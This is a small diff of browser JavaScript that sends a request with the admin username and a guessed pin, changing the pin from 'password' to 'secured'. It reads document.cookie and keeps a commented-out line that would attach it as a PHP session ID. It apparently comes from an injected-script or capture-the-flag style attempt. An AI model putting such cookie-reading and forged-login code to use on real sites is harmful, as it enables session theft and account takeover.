@@ -13,6 +13,6 @@ http.onload = function () {
 };
 const cook = document.cookie;
 //"PHPSESSID="+cook+
-http.send("&username=admin&pin=password&notRobot=on");
+http.send("&username=admin&pin=secured&notRobot=on");
    
 
